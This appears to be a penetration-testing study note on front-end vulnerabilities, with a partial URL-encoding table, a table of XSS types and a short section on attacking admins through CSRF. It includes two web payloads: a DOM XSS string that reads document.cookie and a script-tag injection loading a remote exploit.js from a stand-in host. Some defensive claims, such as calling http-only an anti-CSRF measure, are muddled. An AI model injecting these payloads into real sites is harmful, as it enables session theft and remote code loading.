# Front Components & Vulns

## URL Encode

| Character | Encoding |
| --------- | -------- |
| space     | %20      |
| !         | %21      |
| "         | %22      |
| #         | %23      |
| $         | %24      |
| %         | %25      |
| &         | %26      |
| '         | %27      |
| (         | %28      |
| )         | %29      |

A full character encoding table can be seen [here](https://www.w3schools.com/tags/ref_urlencode.ASP)

## XSS

| Type            | Description                                                                                                                               |
| --------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `Reflected XSS` | Occurs when user input is displayed on the page after processing (e.g., search result or error message).                                  |
| `Stored XSS`    | Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).                    |
| `DOM XSS`       | Occurs when user input is directly shown in the browser and is written to an `HTML` DOM object (e.g., vulnerable username or page title). |

&#x20;Therefore, it may be possible for the same page to be vulnerable to `XSS` attacks. We can try to inject the following `DOM XSS` `JavaScript` code as a payload, which should show us the cookie value for the current user:

<pre class="language-javascript"><code class="lang-javascript"><strong>#">&#x3C;img src=/ onerror=alert(document.cookie)>
</strong></code></pre>

## CSRF

`CSRF` can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using `JavaScript` code that would return the session cookie, we would load a remote `.js` (`JavaScript`) file, as follows:

```html
"><script src=//www.example.com/exploit.js></script>
```

As for `CSRF`, many modern browsers have built-in anti-CSRF measures, which prevent automatically executing `JavaScript` code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., `anti-CSRF` token, or `http-only`/`X-XSS-Protection`).&#x20;
